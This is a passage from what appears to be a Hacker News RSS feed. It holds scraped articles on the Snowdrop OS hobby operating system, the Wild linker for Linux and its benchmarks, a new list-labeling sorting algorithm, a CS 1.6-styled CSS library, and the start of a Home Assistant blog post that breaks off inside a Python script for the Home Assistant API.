<p>Snowdrop OS was born of my childhood curiosity around what happens when a PC is turned on, the mysteries of bootable disks, and the hidden aspects of operating systems. It is a 16-bit real mode operating system for the IBM PC architecture. I designed and developed this homebrew OS from scratch, using only x86 assembly language. 
</p><p>
I have created and included a number of utilities, including a file manager, text editor, graphical applications, BASIC interpreter, x86 assembler and debugger. I also ported one of my DOS games to it. After all, what kind of an operating system doesn't have games?
</p><p>
The Snowdrop OS and the apps are distributed as both a floppy disk (1.44Mb) image, as well as a CD-ROM image. The images contain the following, all programmed from scratch:
</p><ul><li>a boot loader which loads the kernel into memory</li><li>a kernel which sets up interrupt vectors to be used by user apps, and then loads the startup app</li><li>user apps, including a shell (command line interface), utilities, test apps, and aSMtris, my Tetris clone</li></ul><p>
Snowdrop OS can also be installed to a hard disk - prompting the user to do so during boot - if it detects one. 
</p><p>
I hope that Snowdrop can serve other programmers who are looking to get a basic understanding of operating system functions. Like my other projects, the source code is fully available, without any restrictions on its usage and modification.
</p><h2>Source code browser</h2>
<p>
Some interesting areas in the <a href="http://sebastianmihai.com/snowdrop/src">source code</a> are: </p><ul>
<li><a href="http://sebastianmihai.com/snowdrop/src/loader/mbr.asm">Boot loader</a> is crammed into 512 bytes; it locates and loads the kernel</li>
<li>Snowdrop OS's <a href="http://sebastianmihai.com/snowdrop/src/kernel/">kernel</a> provides fundamental services and abstractions to applications</li>
<li><a href="http://sebastianmihai.com/snowdrop/src/apps/common/vga640/">Graphics and GUI framework</a> are the foundations needed to create graphical, mouse-driven applications</li>
<li>Snowdrop's <a href="http://sebastianmihai.com/snowdrop/src/apps/common/assembler/">x86 assembler</a> can be used to create low-level applications directly inside Snowdrop OS</li>
<li><a href="http://sebastianmihai.com/snowdrop/src/apps/common/basic/">BASIC interpreter</a> is great for creating high-level applications quickly</li>
<li>The <a href="http://sebastianmihai.com/snowdrop/src/apps/common/debugger/">x86 debugger</a> can be used in conjunction with the assembler</li>
<li><a href="http://sebastianmihai.com/snowdrop/src/apps/common/dynamic/">Dynamic data structure libraries</a> for working with linked lists, trees, BSTs, etc.</li>
<li><a href="http://sebastianmihai.com/snowdrop/src/apps/">All applications</a> games, text editor, file manager, tools, test applications</li>
</ul>
<h2>Versions</h2>

<p>v1 - initial version, single tasking, shell, aSMtris
<br>v2 - PS/2 mouse driver and mouse test apps
<br>v3 - basic multi-tasking support and virtual display support
<br>v4 - FAT12 driver write/delete, file manager, text editor
<br>v5 - serial port driver, formatting utilities, file copy support
<br>v6 - multiplayer snake game (over serial port)
<br>v7 - slide show presentation app
<br>v8 - "keep memory" task lifetime mode, for custom services
<br>v9 - parallel port driver, BMP image support, sprites
<br>v10 - system timer frequency change
<br>v11 - animated sprites, sound driver (internal speaker)
<br>v12 - keyboard driver
<br>v13 - more sprites functionality, Storks game
<br>v14 - kernel config, program arguments, file utilities
<br>v15 - 16x2 LCD controller app, text editor fixes
<br>v16 - GUI framework
<br>v17 - Snowmine (Minesweeper-like game)
<br>v18 - BASIC interpreter and linker
<br>v19 - install to hard disk
<br>v20 - BASIC and text editor improvements
<br>v21 - integration of BASIC and GUI framework
<br>v22 - x86 assembler, multi-disk support, file view utilities
<br>v23 - x86 debugger
<br>v24 - service loading
<br>v25 - dynamic memory and data structures
<br>v26 - installer improvements, pseudo-mouse driver
<br>v27 - kernel and inter-task messaging
<br>v28 - GUI higher resolution, draw application, desktop application
<br>v29 - data compression, Hangman game
<br>v30 - pseudo-mouse driver improvements
<br>v31 - runtime libraries (RTL), BASIC interpreter RTL
</p>

<p><img alt="" src="http://sebastianmihai.com/snowdrop/images/snowdrop_many_computers.jpg"></p>

				</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Wild – A Fast Linker for Linux (181 pts)]]></title>
            <link>https://github.com/davidlattimore/wild</link>
            <guid>42814683</guid>
            <pubDate>Fri, 24 Jan 2025 16:25:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/davidlattimore/wild">https://github.com/davidlattimore/wild</a>, See on <a href="https://news.ycombinator.com/item?id=42814683">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Wild linker</h2><a id="user-content-wild-linker" aria-label="Permalink: Wild linker" href="#wild-linker"></a></p>
<p dir="auto">Wild is a linker with the goal of being very fast for iterative development.</p>
<p dir="auto">The plan is to eventually make it incremental, however that isn't yet implemented. It is however
already pretty fast even without incremental linking.</p>
<p dir="auto">For production builds, its recommended to use a more mature linker like GNU ld or LLD.</p>
<p dir="auto">During development, if you'd like faster warm build times, then you could give Wild a try. It's at
the point now where it should be usable for development purposes provided you're developing on
x86-64 Linux. If you hit any issues, please file a bug report.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">To install a pre-built binary, you can copy and paste the command from the <a href="https://github.com/davidlattimore/wild/releases">releases
page</a>. Alternatively, you can download the tarball
and manually copy the <code>wild</code> binary somewhere on your path.</p>
<p dir="auto">To build and install, you can run:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo install --locked --bin wild --git https://github.com/davidlattimore/wild.git wild"><pre>cargo install --locked --bin wild --git https://github.com/davidlattimore/wild.git wild</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Using as your default linker</h2><a id="user-content-using-as-your-default-linker" aria-label="Permalink: Using as your default linker" href="#using-as-your-default-linker"></a></p>
<p dir="auto">If you'd like to use Wild as your default linker for building Rust code, you can put the following
in <code>~/.cargo/config.toml</code>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="[target.x86_64-unknown-linux-gnu]
linker = &quot;clang&quot;
rustflags = [&quot;-C&quot;, &quot;link-arg=--ld-path=wild&quot;]"><pre>[<span>target</span>.<span>x86_64-unknown-linux-gnu</span>]
<span>linker</span> = <span><span>"</span>clang<span>"</span></span>
<span>rustflags</span> = [<span><span>"</span>-C<span>"</span></span>, <span><span>"</span>link-arg=--ld-path=wild<span>"</span></span>]</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Q&amp;A</h2><a id="user-content-qa" aria-label="Permalink: Q&amp;A" href="#qa"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Why another linker?</h3><a id="user-content-why-another-linker" aria-label="Permalink: Why another linker?" href="#why-another-linker"></a></p>
<p dir="auto">Mold is already very fast, however it doesn't do incremental linking and the author has stated that
they don't intend to. Wild doesn't do incremental linking yet, but that is the end-goal. By writing
Wild in Rust, it's hoped that the complexity of incremental linking will be achievable.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">What's working?</h3><a id="user-content-whats-working" aria-label="Permalink: What's working?" href="#whats-working"></a></p>
<p dir="auto">The following platforms / architectures are currently supported:</p>
<ul dir="auto">
<li>x86-64 on Linux</li>
</ul>
<p dir="auto">The following is working with the caveat that there may be bugs:</p>
<ul dir="auto">
<li>Output to statically linked, non-relocatable binaries</li>
<li>Output to statically linked, position-independent binaries (static-PIE)</li>
<li>Output to dynamically linked binaries</li>
<li>Output to shared objects (.so files)</li>
<li>Rust proc-macros, when linked with Wild work</li>
<li>Most of the top downloaded crates on crates.io have been tested with Wild and pass their tests</li>
<li>Debug info</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">What isn't yet supported?</h3><a id="user-content-what-isnt-yet-supported" aria-label="Permalink: What isn't yet supported?" href="#what-isnt-yet-supported"></a></p>
<p dir="auto">Lots of stuff. Here are some of the larger things that aren't yet done, roughly sorted by current
priority:</p>
<ul dir="auto">
<li>Incremental linking</li>
<li>Support for architectures other than x86-64</li>
<li>Support for a wider range of linker flags</li>
<li>Linker scripts</li>
<li>Mac support</li>
<li>Windows support</li>
<li>LTO</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">How can I verify that Wild was used to link a binary?</h3><a id="user-content-how-can-i-verify-that-wild-was-used-to-link-a-binary" aria-label="Permalink: How can I verify that Wild was used to link a binary?" href="#how-can-i-verify-that-wild-was-used-to-link-a-binary"></a></p>
<p dir="auto">Install <code>readelf</code>, then run:</p>
<div dir="auto" data-snippet-clipboard-copy-content="readelf  -p .comment my-executable"><pre>readelf  -p .comment my-executable</pre></div>
<p dir="auto">Look for a line like:</p>
<div data-snippet-clipboard-copy-content="Linker: Wild version 0.1.0"><pre><code>Linker: Wild version 0.1.0
</code></pre></div>
<p dir="auto">Or if you don't want to install readelf, you can probably get away with:</p>
<div dir="auto" data-snippet-clipboard-copy-content="strings my-executable | grep 'Linker:'"><pre>strings my-executable <span>|</span> grep <span><span>'</span>Linker:<span>'</span></span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Where did the name come from?</h3><a id="user-content-where-did-the-name-come-from" aria-label="Permalink: Where did the name come from?" href="#where-did-the-name-come-from"></a></p>
<p dir="auto">It's somewhat of a tradition for linkers to end with the letters "ld". e.g. "GNU ld, "gold", "lld",
"mold". Since the end-goal is for the linker to be incremental, an "I" is added. Let's say the "W"
stands for "Wild", since recursive acronyms are popular in open-source projects.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Benchmarks</h2><a id="user-content-benchmarks" aria-label="Permalink: Benchmarks" href="#benchmarks"></a></p>
<p dir="auto">The goal of Wild is to eventually be very fast via incremental linking. However, we also want to be
as fast as we can be for non-incremental linking and for the initial link when incremental linking
is enabled.</p>
<p dir="auto">These benchmark were run on David Lattimore's laptop (2020 model System76 Lemur pro), which has 4
cores (8 threads) and 42 GB of RAM.</p>
<p dir="auto">The following times are for linking rustc-driver, which is a shared object that contains most of the
code of the Rust compiler. Linking was done with with <code>--strip-debug</code> and <code>--build-id=none</code>.</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Linker</th>
<th>Time (ms)</th>
<th>± Standard deviation (ms)</th>
</tr>
</thead>
<tbody>
<tr>
<td>GNU ld (2.38)</td>
<td>20774</td>
<td>855</td>
</tr>
<tr>
<td>gold (2.38)</td>
<td>6796</td>
<td>58</td>
</tr>
<tr>
<td>lld (18.1.8)</td>
<td>1601</td>
<td>24</td>
</tr>
<tr>
<td>mold (2.34.1)</td>
<td>946</td>
<td>17</td>
</tr>
<tr>
<td>wild (2024-11-30)</td>
<td>486</td>
<td>19</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">The following times are for linking the C compiler, clang without debug info.</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Linker</th>
<th>Time (ms)</th>
<th>± Standard deviation (ms)</th>
</tr>
</thead>
<tbody>
<tr>
<td>GNU ld (2.38)</td>
<td>8784</td>
<td>42</td>
</tr>
<tr>
<td>gold (2.38)</td>
<td>2528</td>
<td>37</td>
</tr>
<tr>
<td>lld (18.1.8)</td>
<td>1679</td>
<td>23</td>
</tr>
<tr>
<td>mold (2.34.1)</td>
<td>429</td>
<td>2</td>
</tr>
<tr>
<td>wild (2024-11-30)</td>
<td>244</td>
<td>6</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">Next, let's add debug info (remove <code>--strip-debug</code>). First rustc-driver:</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Linker</th>
<th>Time (ms)</th>
<th>± Standard deviation (ms)</th>
</tr>
</thead>
<tbody>
<tr>
<td>GNU ld (2.38)</td>
<td>23224</td>
<td>1030</td>
</tr>
<tr>
<td>gold (2.38)</td>
<td>8840</td>
<td>879</td>
</tr>
<tr>
<td>lld (18.1.8)</td>
<td>2741</td>
<td>1403</td>
</tr>
<tr>
<td>mold (2.34.1)</td>
<td>3514</td>
<td>2102</td>
</tr>
<tr>
<td>wild (2024-11-30)</td>
<td>3158</td>
<td>1616</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">Now clang with debug info:</p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Linker</th>
<th>Time (ms)</th>
<th>± Standard deviation (ms)</th>
</tr>
</thead>
<tbody>
<tr>
<td>GNU ld (2.38)</td>
<td>139985</td>
<td>9871</td>
</tr>
<tr>
<td>gold (2.38)</td>
<td>92147</td>
<td>7287</td>
</tr>
<tr>
<td>lld (18.1.8)</td>
<td>30549</td>
<td>9819</td>
</tr>
<tr>
<td>mold (2.34.1)</td>
<td>16933</td>
<td>5359</td>
</tr>
<tr>
<td>wild (2024-11-30)</td>
<td>31540</td>
<td>7133</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">So Wild performs pretty well without debug info, but with debug info, it's performing less well at
the moment.</p>
<p dir="auto">See <a href="https://github.com/davidlattimore/wild/blob/main/BENCHMARKING.md">BENCHMARKING.md</a> for more details on benchmarking.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Linking Rust code</h2><a id="user-content-linking-rust-code" aria-label="Permalink: Linking Rust code" href="#linking-rust-code"></a></p>
<p dir="auto">The following is a <code>cargo test</code> command-line that can be used to build and test a crate using Wild.
This has been run successfully on a few popular crates (e.g. ripgrep, serde, tokio, rand, bitflags).
It assumes that the "wild" binary is on your path. It also depends on the Clang compiler being
installed, since GCC doesn't allow using an arbitrary linker.</p>
<div dir="auto" data-snippet-clipboard-copy-content="RUSTFLAGS=&quot;-Clinker=clang -Clink-args=--ld-path=wild&quot; cargo test"><pre>RUSTFLAGS=<span><span>"</span>-Clinker=clang -Clink-args=--ld-path=wild<span>"</span></span> cargo <span>test</span></pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">For more information on contributing to <code>wild</code> see <a href="https://github.com/davidlattimore/wild/blob/main/CONTRIBUTING.md">CONTRIBUTING.md</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Sponsorship</h2><a id="user-content-sponsorship" aria-label="Permalink: Sponsorship" href="#sponsorship"></a></p>
<p dir="auto">If you'd like to <a href="https://github.com/sponsors/davidlattimore">sponsor this work</a>, that would be very
much appreciated. The more sponsorship I get the longer I can continue to work on this project full
time.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">Licensed under either of <a href="https://github.com/davidlattimore/wild/blob/main/LICENSE-APACHE">Apache License, Version 2.0</a> or <a href="https://github.com/davidlattimore/wild/blob/main/LICENSE-MIT">MIT license</a>
at your option.</p>
<p dir="auto">Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in
Wild by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any
additional terms or conditions.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[New Book-Sorting Algorithm Almost Reaches Perfection (122 pts)]]></title>
            <link>https://www.quantamagazine.org/new-book-sorting-algorithm-almost-reaches-perfection-20250124/</link>
            <guid>42814275</guid>
            <pubDate>Fri, 24 Jan 2025 15:50:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.quantamagazine.org/new-book-sorting-algorithm-almost-reaches-perfection-20250124/">https://www.quantamagazine.org/new-book-sorting-algorithm-almost-reaches-perfection-20250124/</a>, See on <a href="https://news.ycombinator.com/item?id=42814275">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-role="selectable">
    <p>Computer scientists often deal with abstract problems that are hard to comprehend, but an exciting new algorithm matters to anyone who owns books and at least one shelf. The algorithm addresses something called the library sorting problem (more formally, the “list labeling” problem). The challenge is to devise a strategy for organizing books in some kind of sorted order — alphabetically, for instance — that minimizes how long it takes to place a new book on the shelf.</p>
<p>Imagine, for example, that you keep your books clumped together, leaving empty space on the far right of the shelf. Then, if you add a book by Isabel Allende to your collection, you might have to move every book on the shelf to make room for it. That would be a time-consuming operation. And if you then get a book by Douglas Adams, you’ll have to do it all over again. A better arrangement would leave unoccupied spaces distributed throughout the shelf — but how, exactly, should they be distributed?</p>
<p>This problem was introduced in a <a href="https://link.springer.com/chapter/10.1007/3-540-10843-2_34">1981 paper</a>, and it goes beyond simply providing librarians with organizational guidance. That’s because the problem also applies to the arrangement of files on hard drives and in databases, where the items to be arranged could number in the billions. An inefficient system means significant wait times and major computational expense. Researchers have invented some efficient methods for storing items, but they’ve long wanted to determine the best possible way.</p>
<p>Last year, in <a href="https://arxiv.org/abs/2405.00807">a study</a> that was presented at the Foundations of Computer Science conference in Chicago, a team of seven researchers described a way to organize items that comes tantalizingly close to the theoretical ideal. The new approach combines a little knowledge of the bookshelf’s past contents with the surprising power of randomness.</p>
<p>“It’s a very important problem,” said <a href="https://web.eecs.umich.edu/~pettie/">Seth Pettie</a>, a computer scientist at the University of Michigan, because many of the data structures we rely upon today store information sequentially. He called the new work “extremely inspired [and] easily one of my top three favorite papers of the year.”</p>
<h2><strong>Narrowing Bounds</strong></h2>
<p>So how does one measure a well-sorted bookshelf? A common way is to see how long it takes to insert an individual item. Naturally, that depends on how many items there are in the first place, a value typically denoted by <em>n</em>. In the Isabel Allende example, when all the books have to move to accommodate a new one, the time it takes is proportional to <em>n</em>. The bigger the <em>n</em>, the longer it takes. That makes this an “upper bound” to the problem: It will never take longer than a time proportional to <em>n</em> to add one book to the shelf.</p>

<p>The authors of the 1981 paper that ushered in this problem wanted to know if it was possible to design an algorithm with an average insertion time much less than<em> n</em>. And indeed, they proved that one could do better. They created an algorithm that was guaranteed to achieve an average insertion time proportional to (log <em>n</em>)<sup>2</sup>. This algorithm had two properties: It was “deterministic,” meaning that its decisions did not depend on any randomness, and it was also “smooth,” meaning that the books must be spread evenly within subsections of the shelf where insertions (or deletions) are made. The authors left open the question of whether the upper bound could be improved even further. For over four decades, no one managed to do so.</p>
<p>However, the intervening years did see improvements to the lower bound. While the upper bound specifies the maximum possible time needed to insert a book, the lower bound gives the fastest possible insertion time. To find a definitive solution to a problem, researchers strive to narrow the gap between the upper and lower bounds, ideally until they coincide. When that happens, the algorithm is deemed optimal — inexorably bounded from above and below, leaving no room for further refinement.</p>
<p>In 2004, a team of researchers found that the <a href="https://epubs.siam.org/doi/abs/10.1137/S0895480100315808?journalCode=sjdmec">best any algorithm could do</a> for the library sorting problem — in other words, the ultimate lower bound — was log <em>n</em>. This result pertained to the most general version of the problem, applying to any algorithm of any type. Two of the same authors had already secured a result for a more specific version of the problem in 1990, showing that for any smooth algorithm, <a href="https://link.springer.com/chapter/10.1007/3-540-52846-6_87">the lower bound is significantly higher</a>: (log <em>n</em>)<sup>2</sup>. And in 2012, another team <a href="https://dl.acm.org/doi/abs/10.1145/2213977.2214083">proved the same lower bound</a>, (log <em>n</em>)<sup>2</sup>, for any deterministic algorithm that does not use randomness at all.</p>
<p>These results showed that for any smooth or deterministic algorithm, you could not achieve an average insertion time better than (log <em>n</em>)<sup>2</sup>, which was the same as the upper bound established in the 1981 paper. In other words, to improve that upper bound, researchers would need to devise a different kind of algorithm. “If you’re going to do better, you have to be randomized and non-smooth,” said <a href="https://www.cs.stonybrook.edu/people/faculty/michaelbender">Michael Bender</a>, a computer scientist at Stony Brook University.</p>
<figure>
    <p><img width="1630" height="1221" src="https://www.quantamagazine.org/wp-content/uploads/2025/01/MichaelBender_coMichaelBender-2-edit2.jpg" alt="Michael Bender in a blue shirt wearing black glasses." decoding="async" srcset="https://www.quantamagazine.org/wp-content/uploads/2025/01/MichaelBender_coMichaelBender-2-edit2.jpg 1630w, https://www.quantamagazine.org/wp-content/uploads/2025/01/MichaelBender_coMichaelBender-2-edit2-520x390.jpg 520w, https://www.quantamagazine.org/wp-content/uploads/2025/01/MichaelBender_coMichaelBender-2-edit2-768x575.jpg 768w, https://www.quantamagazine.org/wp-content/uploads/2025/01/MichaelBender_coMichaelBender-2-edit2-1536x1151.jpg 1536w" sizes="(max-width: 1630px) 100vw, 1630px">    </p>
            <figcaption>
                            <p>Michael Bender went after the library sorting problem using an approach that didn’t necessarily make intuitive sense.</p>
            <p>Courtesy of Michael Bender</p>
        </figcaption>
    </figure>

<p>But getting rid of smoothness, which requires items to be spread apart more or less evenly, seemed like a mistake. (Remember the problems that arose from our initial example — the non-smooth configuration where all the books were clumped together on the left-hand side of the shelf.) And it also was not obvious how leaving things to random chance — essentially a coin toss — would help matters. “Intuitively, it wasn’t clear that was a direction that made sense,” Bender said.</p>
<p>Nevertheless, in 2022, Bender and five colleagues decided to try out a randomized, non-smooth algorithm anyway, just to see whether it might offer any advantages.</p>
<h2><strong>A Secret History</strong></h2>
<p>Ironically, progress came from another restriction. There are sound privacy or security reasons why you may want to use an algorithm that’s blind to the history of the bookshelf. “If I had <em>50 Shades of Grey </em>on my bookshelf and took it off,” said <a href="https://csd.cmu.edu/people/faculty/william-kuszmaul">William Kuszmaul</a> of Carnegie Mellon University, nobody would be able to tell.</p>

<p>In a 2022 paper, Bender, Kuszmaul and four co-authors created just such an algorithm — one that was “history independent,” non-smooth and randomized — which finally <a href="https://arxiv.org/abs/2203.02763">reduced the 1981 upper bound</a>, bringing the average insertion time down to (log <em>n</em>)<sup>1.5</sup>.</p>
<p>Kuszmaul remembers being surprised that a tool normally used to ensure privacy could confer other benefits. “It’s as if you used cryptography to make your algorithm faster,” he said. “Which just seems kind of strange.”</p>
<p><a href="https://www.cc.gatech.edu/people/helen-xu">Helen Xu</a> of the Georgia Institute of Technology, who was not part of this research team, was also impressed.&nbsp; She said that the idea of using history independence for reasons other than security may have implications for many other types of problems.</p>
<h2><strong>Closing the Gap</strong></h2>
<p>Bender, Kuszmaul and others made an even bigger improvement with last year’s paper. They again broke the record, lowering the upper bound to (log <em>n</em>) times (log log <em>n</em>)<sup>3</sup> — equivalent to (log <em>n</em>)<sup>1.000…1</sup>. In other words, they came exceedingly close to the theoretical limit, the ultimate lower bound of log <em>n</em>.</p>
<p>Once again, their approach was non-smooth and randomized, but this time their algorithm relied on a limited degree of history dependence. It looked at past trends to plan for future events, but only up to a point. Suppose, for instance, you’ve been getting a lot of books by authors whose last name starts with N — Nabokov, Neruda, Ng. The algorithm extrapolates from that and assumes more are probably coming, so it’ll leave a little extra space in the N section. But reserving too much space could lead to trouble if a bunch of A-name authors start pouring in. “The way we made it a good thing was by being strategically random about how much history to look at when we make our decisions,” Bender said.</p>
<p>The result built on and transformed their previous work. It “uses randomness in a completely different way than the 2022 paper,” Pettie said.</p>
        
        
<p>These papers collectively represent “a significant improvement” on the theory side, said <a href="https://computerscience.uchicago.edu/people/brian-wheatman/">Brian Wheatman</a>, a computer scientist at the University of Chicago. “And on the applied side, I think they have the potential for a big improvement as well.”</p>
<p>Xu agrees. “In the past few years, there’s been interest in using data structures based on list labeling for storing and processing dynamic graphs,” she said. These advances would almost certainly make things faster.</p>
<p>Meanwhile, there’s more for theorists to contemplate. “We know that we can almost do log <em>n</em>,” Bender said, “[but] there’s still this tiny gap” — the diminutive log log <em>n </em>term that stands in the way of a complete solution. “We don’t know if the right thing to do is to lower the upper bound or raise the lower bound.”</p>
<p>Pettie, for one, doesn’t expect the lower bound to change. “Usually in these situations, when you see a gap this close, and one of the bounds looks quite natural and the other looks unnatural, then the natural one is the right answer,” he said. It’s much more likely that any future improvements will affect the upper bound, bringing it all the way down to log <em>n.</em> “But the world’s full of weird surprises.”</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Cs16.css – CSS library based on CS 1.6 UI (247 pts)]]></title>
            <link>https://cs16.samke.me</link>
            <guid>42814110</guid>
            <pubDate>Fri, 24 Jan 2025 15:37:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://cs16.samke.me">https://cs16.samke.me</a>, See on <a href="https://news.ycombinator.com/item?id=42814110">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <h2>Dialog</h2>

        <section>
          
          <dialog>
            <form method="dialog">
              
              <p>
                Lorem ipsum dolor sit amet consectetur adipisicing elit.
                Distinctio ad suscipit aut asperiores laudantium error amet
                sapiente et tempora numquam voluptates, velit sint quos
                exercitationem unde obcaecati deleniti maiores officia natus
                ipsa rem fuga commodi esse. Sunt repellendus ipsa illo a
                accusantium consequuntur nihil dicta necessitatibus porro,
                saepe, sed repudiandae!
              </p>
              <menu>
                
                
                
              </menu>
            </form>
          </dialog>
        </section>

        <div>
            <pre><code id="code-block">&lt;section&gt;
  &lt;button
    type="button"
    class="cs-btn"
    onclick="document.querySelector('.cs-dialog').showModal();"
  &gt;
    Open dialog
  &lt;/button&gt;
  &lt;dialog class="cs-dialog"&gt;
    &lt;form method="dialog"&gt;
      &lt;div class="heading"&gt;
        &lt;div class="wrapper"&gt;
          &lt;div class="icon"&gt;&lt;/div&gt;
          &lt;p class="text"&gt;Options&lt;/p&gt;
        &lt;/div&gt;
        &lt;button class="cs-btn close"&gt;&lt;/button&gt;
      &lt;/div&gt;
      &lt;div class="content"&gt;
        Lorem ipsum dolor sit amet consectetur adipisicing elit.
        Distinctio ad suscipit aut asperiores laudantium error amet
        sapiente et tempora numquam voluptates, velit sint quos
        exercitationem unde obcaecati deleniti maiores officia natus
        ipsa rem fuga commodi esse. Sunt repellendus ipsa illo a
        accusantium consequuntur nihil dicta necessitatibus porro,
        saepe, sed repudiandae!
      &lt;/div&gt;
      &lt;menu class="footer-btns"&gt;
        &lt;button class="cs-btn"&gt;OK&lt;/button&gt;
        &lt;button class="cs-btn"&gt;Cancel&lt;/button&gt;
        &lt;button class="cs-btn"&gt;Apply&lt;/button&gt;
      &lt;/menu&gt;
    &lt;/form&gt;
  &lt;/dialog&gt;
&lt;/section&gt;</code></pre>
          </div>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How I Use Home Assistant in 2025 (109 pts)]]></title>
            <link>https://vpetersson.com/2025/01/22/how-i-use-home-assistant-in-2025.html</link>
            <guid>42813513</guid>
            <pubDate>Fri, 24 Jan 2025 14:51:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://vpetersson.com/2025/01/22/how-i-use-home-assistant-in-2025.html">https://vpetersson.com/2025/01/22/how-i-use-home-assistant-in-2025.html</a>, See on <a href="https://news.ycombinator.com/item?id=42813513">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>
        <p>I’ve been using Home Assistant for about seven years now, starting back when I was living in a small apartment. At the time, my setup was modest: I used the <strong>IKEA Smart Hub</strong> (when it first launched) to tie together all my apartment’s lights. As I got more comfortable with automations, I also began building <a href="https://vpetersson.com/2019/11/16/home-assistant-and-esphome.html">custom hardware like temperature and humidity sensors</a>.</p>

<p>However, once I started adding more complexity (more devices, more automations), I realized that running Home Assistant on a Raspberry Pi just wasn’t viable anymore. This was before Home Assistant offered their own hardware (which I haven’t tried, so I can’t say much about it). But for me, the main issue was the database. By default, Home Assistant uses SQLite, and when you have a ton of sensor data flowing in, SQLite can start choking.</p>

<p>My solution was to move everything to a VM on my home server. I also migrated Home Assistant’s main database to MySQL, and for longer-term metrics and historical data, I set up an InfluxDB server. (I’ve documented the details of my <a href="https://vpetersson.com/2024/05/04/home-server-journey.html">home server build in another blog post</a>.)</p>

<h2 id="scaling-up-in-a-new-house">Scaling Up in a New House</h2>

<p>When I moved into a house, my Home Assistant installation grew significantly: more rooms, more lights, and more devices overall. Right now, I have over 100 devices connected to Home Assistant, including a large number of smart lights (all IKEA), plus an assortment of other smart devices. Practically every bulb in my home is now integrated into Home Assistant.</p>

<h3 id="adaptive-lighting-moving-beyond-flux">Adaptive Lighting: Moving Beyond Flux</h3>

<p>One of the crucial features for me is <strong>Adaptive Lighting</strong>. Initially, I used <a href="https://vpetersson.com/2020/05/25/homeassistant-ikea-tradfri-flux-sensors.html">Flux</a> (an older solution for synchronizing lights with the time of day), but I’ve recently migrated to the new Adaptive Lighting integration available through HACS (Home Assistant Community Store). This newer system is much more sophisticated and has better capabilities for adjusting color temperature and brightness throughout the day.</p>

<p>Managing this setup comes with two main challenges. First, neither Flux nor Adaptive Lighting can target light groups. Instead, you need to explicitly list every single light entity in your configuration. This becomes particularly tedious when you have dozens of lights that you want to manage together. It would have been much more convenient to just point the integration to a group and have it handle all the lights within that group automatically.</p>

<p>The second challenge is that even though all my bulbs are from IKEA, they don’t have all the same features. This means I need separate configurations for each category to get Adaptive Lighting working correctly. But the effort is worth it: circadian rhythms are important to me, and I really want that smooth, automatic shift in color temperature from warm yellows in the morning and evenings to cooler whites and blues during midday.</p>

<h2 id="using-cursor-to-speed-up-configuration">Using Cursor to Speed Up Configuration</h2>

<p>One big leap for me this year has been leveraging <a href="https://www.cursor.com/">Cursor</a>, an AI coding assistant, to handle the more tedious parts of Home Assistant’s YAML configurations. I’ll admit, I’ve never had the time to master every detail of Home Assistant’s DSL or its configuration files.</p>

<h3 id="writing-a-custom-parser">Writing a Custom Parser</h3>

<p>The first major task I tackled with Cursor was writing a custom script to parse all my lights, figure out exactly what kind of bulb each one is, and spit out debugging information. This is the foundation of building the correct adaptive lighting setup. Once the script categorizes the bulbs, I can then create or update the YAML configuration for each bulb type.</p>

<p>Here’s the script I use to analyze my Home Assistant lights. It connects to the Home Assistant API, categorizes all lights by their capabilities, and provides detailed debugging information about their current state and supported features:</p>

<div><pre><code><span>import</span> <span>requests</span>
<span>import</span> <span>json</span>
<span>import</span> <span>os</span>
<span>from</span> <span>datetime</span> <span>import</span> <span>datetime</span>

<span>TOKEN</span> <span>=</span> <span>os</span><span>.</span><span>getenv</span><span>(</span><span>"HA_TOKEN"</span><span>)</span>  <span># Set this to your long-lived access token (Bearer: &lt;token&gt;)
</span>
<span># Function to get entity state
</span><span>def</span> <span>get_entity_state</span><span>(</span><span>entity_id</span><span>):</span>
    <span>url</span> <span>=</span> <span>"http://localhost:8123/api/states/"</span> <span>+</span> <span>entity_id</span>
    <span>headers</span> <span>=</span> <span>{</span>
        <span>"Authorization"</span><span>:</span> <span>TOKEN</span><span>,</span>
        <span>"content-type"</span><span>:</span> <span>"application/json"</span><span>,</span>
